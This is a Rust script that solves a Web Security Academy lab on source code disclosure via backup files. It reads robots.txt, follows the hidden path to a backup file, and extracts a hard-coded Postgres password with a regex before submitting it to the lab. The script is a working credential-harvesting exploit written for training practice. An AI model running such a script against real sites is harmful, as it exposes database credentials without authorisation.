/**************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 3/9/2023
*
* Lab: Source code disclosure via backup files
*
* Steps: 1. Fetch /robots.txt file
*        2. List the hidden directory
*        3. Fetch the hidden backup file
*        4. Extract the key
*        5. Submit the solution
*
***************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{collections::HashMap, time::Duration};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a02002404bb06ec8272cf2000290076.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "⦗1⦘ Fetching the robots.txt file..".white(),
        "OK".green()
    );

    // fetch the robots.txt file
    let robots = client
        .get(format!("{url}/robots.txt"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the robots.txt file".red()
        ));

    // get the body of the response
    let mut body = robots.text().unwrap();

    // extract the hidden name
    let hidden = capture_pattern("Disallow: (.*)", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the hidden name".red()
    ));

    println!(
        "{} {} => {}",
        "⦗2⦘ Searching for hidden files..".white(),
        "OK".green(),
        hidden.yellow()
    );

    // fetch the backup directory
    let backup_dir = client.get(format!("{url}{hidden}")).send().expect(&format!(
        "{}",
        "[!] Failed to fetch the backup directory".red()
    ));

    println!(
        "{} {}",
        "⦗3⦘ Fetching the backup directory..".white(),
        "OK".green()
    );

    // get the body of the backup directory
    body = backup_dir.text().unwrap();

    // extract path to the backup file
    let backup_file_path = capture_pattern("href='(.*)'>", &body).expect(&format!(
        "{}",
        "[!] Failed to extract path to the backup file".red()
    ));

    println!(
        "{} {} => {}",
        "⦗4⦘ Extracting the path to the backup file..".white(),
        "OK".green(),
        backup_file_path.yellow()
    );

    // fetch the backup file
    let backup_file = client
        .get(format!("{url}{backup_file_path}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the backup file".red()));

    println!(
        "{} {}",
        "⦗5⦘ Fetching the backup file..".white(),
        "OK".green()
    );

    // get the body of the response
    body = backup_file.text().unwrap();

    // extract the key
    let key = capture_pattern(r#"\"postgres\",\s*\"postgres\",\s*\"(.*)\""#, &body)
        .expect(&format!("{}", "[!] Failed to extract the key".red()));

    println!(
        "{} {} => {}",
        "⦗6⦘ Extracting key ..".white(),
        "OK".green(),
        key.yellow()
    );

    // submit the solution
    client
        .post(format!("{url}/submitSolution"))
        .form(&HashMap::from([("answer", key)]))
        .send();

    println!(
        "{} {}",
        "⦗7⦘ Submitting the solution..".white(),
        "OK".green()
    );
    println!(
        "{} {}",
        "🗹 The lab should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap().captures(text);
    if pattern.is_some() {
        Some(pattern.unwrap().get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
